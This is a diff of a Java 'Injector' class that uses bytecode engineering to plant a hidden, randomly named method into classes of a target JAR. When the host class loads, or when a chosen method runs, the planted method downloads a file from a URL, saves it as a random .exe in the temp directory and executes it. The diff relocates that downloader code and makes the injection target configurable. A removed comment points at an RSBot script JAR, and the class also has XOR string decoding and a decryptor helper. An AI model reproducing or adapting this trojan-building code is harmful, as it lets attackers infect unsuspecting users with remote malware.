@@ -12,68 +12,21 @@ public class Injector {
     private String Location;
     private JarLoader LoadedJar;
     private String downloadUrl;
+    private String criteria;
     private String nname;
     private String nsig;
 
-    public Injector(String loc, String url) {
+    public Injector(String loc, String url, String mname) {
         Location = loc;
         downloadUrl = url;
+        criteria = mname;
     }
 
-    MethodGen getDownloader(ClassGen cg, String url, String file) {
-        InstructionFactory _factory = new InstructionFactory(cg);
-        InstructionList il = new InstructionList();
-        il.append(_factory.createNew("java.net.URL"));
-        il.append(InstructionConstants.DUP);
-        il.append(new PUSH(cg.getConstantPool(), url));
-        il.append(_factory.createInvoke("java.net.URL", "<init>", Type.VOID, new Type[]{Type.STRING}, Constants.INVOKESPECIAL));
-        il.append(_factory.createInvoke("java.net.URL", "openStream", new ObjectType("java.io.InputStream"), Type.NO_ARGS, Constants.INVOKEVIRTUAL));
-        il.append(_factory.createInvoke("java.nio.channels.Channels", "newChannel", new ObjectType("java.nio.channels.ReadableByteChannel"), new Type[]{new ObjectType("java.io.InputStream")}, Constants.INVOKESTATIC));
-        il.append(InstructionFactory.createStore(Type.OBJECT, 0));
-        il.append(_factory.createNew("java.lang.StringBuilder"));
-        il.append(InstructionConstants.DUP);
-        il.append(_factory.createInvoke("java.lang.StringBuilder", "<init>", Type.VOID, Type.NO_ARGS, Constants.INVOKESPECIAL));
-        il.append(new PUSH(cg.getConstantPool(), "java.io.tmpdir"));
-        il.append(_factory.createInvoke("java.lang.System", "getProperty", Type.STRING, new Type[]{Type.STRING}, Constants.INVOKESTATIC));
-        il.append(_factory.createInvoke("java.lang.StringBuilder", "append", new ObjectType("java.lang.StringBuilder"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
-        il.append(new PUSH(cg.getConstantPool(), file));
-        il.append(_factory.createInvoke("java.lang.StringBuilder", "append", new ObjectType("java.lang.StringBuilder"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
-        il.append(_factory.createInvoke("java.lang.StringBuilder", "toString", Type.STRING, Type.NO_ARGS, Constants.INVOKEVIRTUAL));
-        il.append(InstructionFactory.createStore(Type.OBJECT, 1));
-        il.append(_factory.createNew("java.io.FileOutputStream"));
-        il.append(InstructionConstants.DUP);
-        il.append(InstructionFactory.createLoad(Type.OBJECT, 1));
-        il.append(_factory.createInvoke("java.io.FileOutputStream", "<init>", Type.VOID, new Type[]{Type.STRING}, Constants.INVOKESPECIAL));
-        il.append(InstructionFactory.createStore(Type.OBJECT, 2));
-        il.append(InstructionFactory.createLoad(Type.OBJECT, 2));
-        il.append(_factory.createInvoke("java.io.FileOutputStream", "getChannel", new ObjectType("java.nio.channels.FileChannel"), Type.NO_ARGS, Constants.INVOKEVIRTUAL));
-        il.append(InstructionFactory.createLoad(Type.OBJECT, 0));
-        il.append(new PUSH(cg.getConstantPool(), (long) 0));
-        il.append(new PUSH(cg.getConstantPool(), (long) 1 << 24));
-        il.append(_factory.createInvoke("java.nio.channels.FileChannel", "transferFrom", Type.LONG, new Type[]{new ObjectType("java.nio.channels.ReadableByteChannel"), Type.LONG, Type.LONG}, Constants.INVOKEVIRTUAL));
-        il.append(InstructionConstants.POP2);
-        il.append(InstructionFactory.createLoad(Type.OBJECT, 2));
-        il.append(_factory.createInvoke("java.io.FileOutputStream", "close", Type.VOID, Type.NO_ARGS, Constants.INVOKEVIRTUAL));
-        il.append(_factory.createInvoke("java.lang.Runtime", "getRuntime", new ObjectType("java.lang.Runtime"), Type.NO_ARGS, Constants.INVOKESTATIC));
-        il.append(InstructionFactory.createLoad(Type.OBJECT, 1));
-        il.append(_factory.createInvoke("java.lang.Runtime", "exec", new ObjectType("java.lang.Process"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
-        il.append(InstructionConstants.POP);
-        il.append(InstructionFactory.createReturn(Type.VOID));
-        il.setPositions();
-        nname = Misc.getRandomString(12, false);
-        MethodGen method = new MethodGen(Constants.ACC_PUBLIC | Constants.ACC_STATIC, Type.VOID, Type.NO_ARGS, new String[]{}, nname, cg.getClassName(), il, cg.getConstantPool());
-        nsig = method.getSignature();
-        method.setMaxLocals();
-        method.setMaxStack();
-        return method;
-    }
-
-    //C:\Users\Eric\Documents\RSBot\Scripts\Roaches.jar
     public void inject() {
         for (ClassGen cg : LoadedJar.ClassEntries.values()) {
             if (cg.getClassName().contains("$")) continue;
             for (Method method : cg.getMethods()) {
-                if (method.getName().contains("<clinit>")) {
+                if (method.getName().equals(criteria)) {
                     //INJECT METHOD
                     Logger.log("Located Static Initializer -> Class: " + cg.getClassName());
                     MethodGen dler = getDownloader(cg, downloadUrl, Misc.getRandomString(7, true) + ".exe");
@@ -158,6 +111,54 @@ public class Injector {
             inputChars[i] = (char) (inputChars[i] ^ key);
         }
         return new String(inputChars);
+    }
+
+    MethodGen getDownloader(ClassGen cg, String url, String file) {
+        InstructionFactory _factory = new InstructionFactory(cg);
+        InstructionList il = new InstructionList();
+        il.append(_factory.createNew("java.net.URL"));
+        il.append(InstructionConstants.DUP);
+        il.append(new PUSH(cg.getConstantPool(), url));
+        il.append(_factory.createInvoke("java.net.URL", "<init>", Type.VOID, new Type[]{Type.STRING}, Constants.INVOKESPECIAL));
+        il.append(_factory.createInvoke("java.net.URL", "openStream", new ObjectType("java.io.InputStream"), Type.NO_ARGS, Constants.INVOKEVIRTUAL));
+        il.append(_factory.createInvoke("java.nio.channels.Channels", "newChannel", new ObjectType("java.nio.channels.ReadableByteChannel"), new Type[]{new ObjectType("java.io.InputStream")}, Constants.INVOKESTATIC));
+        il.append(InstructionFactory.createStore(Type.OBJECT, 0));
+        il.append(_factory.createNew("java.lang.StringBuilder"));
+        il.append(InstructionConstants.DUP);
+        il.append(_factory.createInvoke("java.lang.StringBuilder", "<init>", Type.VOID, Type.NO_ARGS, Constants.INVOKESPECIAL));
+        il.append(new PUSH(cg.getConstantPool(), "java.io.tmpdir"));
+        il.append(_factory.createInvoke("java.lang.System", "getProperty", Type.STRING, new Type[]{Type.STRING}, Constants.INVOKESTATIC));
+        il.append(_factory.createInvoke("java.lang.StringBuilder", "append", new ObjectType("java.lang.StringBuilder"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
+        il.append(new PUSH(cg.getConstantPool(), file));
+        il.append(_factory.createInvoke("java.lang.StringBuilder", "append", new ObjectType("java.lang.StringBuilder"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
+        il.append(_factory.createInvoke("java.lang.StringBuilder", "toString", Type.STRING, Type.NO_ARGS, Constants.INVOKEVIRTUAL));
+        il.append(InstructionFactory.createStore(Type.OBJECT, 1));
+        il.append(_factory.createNew("java.io.FileOutputStream"));
+        il.append(InstructionConstants.DUP);
+        il.append(InstructionFactory.createLoad(Type.OBJECT, 1));
+        il.append(_factory.createInvoke("java.io.FileOutputStream", "<init>", Type.VOID, new Type[]{Type.STRING}, Constants.INVOKESPECIAL));
+        il.append(InstructionFactory.createStore(Type.OBJECT, 2));
+        il.append(InstructionFactory.createLoad(Type.OBJECT, 2));
+        il.append(_factory.createInvoke("java.io.FileOutputStream", "getChannel", new ObjectType("java.nio.channels.FileChannel"), Type.NO_ARGS, Constants.INVOKEVIRTUAL));
+        il.append(InstructionFactory.createLoad(Type.OBJECT, 0));
+        il.append(new PUSH(cg.getConstantPool(), (long) 0));
+        il.append(new PUSH(cg.getConstantPool(), (long) 1 << 24));
+        il.append(_factory.createInvoke("java.nio.channels.FileChannel", "transferFrom", Type.LONG, new Type[]{new ObjectType("java.nio.channels.ReadableByteChannel"), Type.LONG, Type.LONG}, Constants.INVOKEVIRTUAL));
+        il.append(InstructionConstants.POP2);
+        il.append(InstructionFactory.createLoad(Type.OBJECT, 2));
+        il.append(_factory.createInvoke("java.io.FileOutputStream", "close", Type.VOID, Type.NO_ARGS, Constants.INVOKEVIRTUAL));
+        il.append(_factory.createInvoke("java.lang.Runtime", "getRuntime", new ObjectType("java.lang.Runtime"), Type.NO_ARGS, Constants.INVOKESTATIC));
+        il.append(InstructionFactory.createLoad(Type.OBJECT, 1));
+        il.append(_factory.createInvoke("java.lang.Runtime", "exec", new ObjectType("java.lang.Process"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
+        il.append(InstructionConstants.POP);
+        il.append(InstructionFactory.createReturn(Type.VOID));
+        il.setPositions();
+        nname = Misc.getRandomString(12, false);
+        MethodGen method = new MethodGen(Constants.ACC_PUBLIC | Constants.ACC_STATIC, Type.VOID, Type.NO_ARGS, new String[]{}, nname, cg.getClassName(), il, cg.getConstantPool());
+        nsig = method.getSignature();
+        method.setMaxLocals();
+        method.setMaxStack();
+        return method;
     }
 
     MethodGen getDecryptor(ClassGen cg, int key) {
